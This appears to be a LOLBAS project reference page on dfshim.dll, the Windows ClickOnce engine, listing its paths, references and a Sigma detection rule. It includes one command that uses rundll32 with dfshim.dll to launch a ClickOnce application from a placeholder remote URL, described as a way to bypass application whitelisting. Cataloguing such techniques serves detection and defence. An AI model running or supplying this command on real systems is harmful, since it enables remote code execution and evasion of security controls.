---
title: "Dfshim.dll"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Libraries/Dfshim/
fetched_at: 2026-09-20T17:16:10Z
license: unspecified
category: windows
---

ClickOnce engine in Windows used by .NET

## Paths
- C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe

## Resources
- [https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf](https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf)
- [https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe](https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe)

## Acknowledgements
- Casey Smith ([@subtee](https://twitter.com/@subtee))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

## AWL bypass

1. Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)

```
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

   - Use case: Use binary to bypass Application whitelisting

   - Privileges required: User

   - Operating systems: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1127.002

   - Tags: Execute: ClickOnceExecute: Remote
